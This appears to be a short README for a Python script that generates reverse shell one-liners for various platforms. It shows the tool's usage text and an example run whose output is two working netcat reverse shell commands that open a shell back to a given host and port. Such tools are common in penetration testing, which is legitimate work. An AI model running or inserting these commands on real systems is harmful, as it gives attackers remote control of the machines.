# ReverseShellGenerator
A python script to format reverse shells for various platforms

## Usage

```
usage: rev.py [-h] [-p PLATFORM] [-l] [-a] host port

positional arguments:
  host
  port

optional arguments:
  -h, --help            show this help message and exit
  -p PLATFORM, --platform PLATFORM
  -l, --list            list available platforms
  -a, --all             print all reverse shells
```

## Example

```
root@kali:~# ./rev.py 192.168.1.1 1337 -p netcat
nc -e /bin/sh 192.168.1.1 1337
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 1337 >/tmp/f
```
